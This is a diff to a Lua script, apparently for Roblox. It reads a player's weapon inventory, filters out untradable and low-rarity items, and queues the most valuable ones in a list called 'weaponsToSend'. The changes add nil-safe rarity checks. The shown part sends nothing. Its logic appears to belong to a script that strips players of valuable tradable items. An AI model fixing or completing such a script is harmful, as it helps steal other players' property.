@@ -492,38 +492,50 @@ local untradable = {
 local valueList = buildValueList()
 local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 
--- Replace the entire loop with this fixed version
-
+-- Replace the entire loop with this version
 for i, v in pairs(realData.Weapons.Owned) do
     local dataid = i
     local amount = v
-    local rarity = database[dataid].Rarity
-    local weapon_rarity_index = table.find(rarityTable, rarity)
     
-    -- Check if rarity exists in table
-    if not weapon_rarity_index then
+    -- Create a safe function to check rarity
+    local function checkRarity(rarityName, compareTo)
+        if not rarityName or not compareTo then return false end
+        
+        local rarityIndex = table.find(rarityTable, rarityName)
+        local compareIndex = table.find(rarityTable, compareTo)
+        
+        if not rarityIndex or not compareIndex then return false end
+        
+        return rarityIndex >= compareIndex
+    end
+    
+    -- Check if dataid exists in database
+    if not database[dataid] then
         goto continue
     end
     
-    if weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
+    local itemData = database[dataid]
+    if not itemData or not itemData.Rarity then
+        goto continue
+    end
+    
+    local rarity = itemData.Rarity
+    
+    -- Only process if item meets rarity requirements and isn't untradable
+    if checkRarity(rarity, min_rarity) and not untradable[dataid] then
         local value
         if valueList[dataid] then
             value = valueList[dataid]
         else
-            -- FIX: Get Godly index once and check for nil
-            local godlyIndex = table.find(rarityTable, "Godly")
-            
-            -- If Godly index is nil, use a default (all items will be value 1)
-            if not godlyIndex then
-                value = 1
-            elseif weapon_rarity_index >= godlyIndex then
+            -- Use our safe function to check if rarity is Godly or higher
+            if checkRarity(rarity, "Godly") then
                 value = 2
             else
                 value = 1
             end
         end
         
-        if value >= min_value then
+        if value and value >= min_value then
             totalValue = totalValue + (value * amount)
             table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
         end
@@ -531,7 +543,6 @@ for i, v in pairs(realData.Weapons.Owned) do
     
     ::continue::
 end
-
 if #weaponsToSend > 0 then
     table.sort(weaponsToSend, function(a, b)
         return (a.Value * a.Amount) > (b.Value * b.Amount)
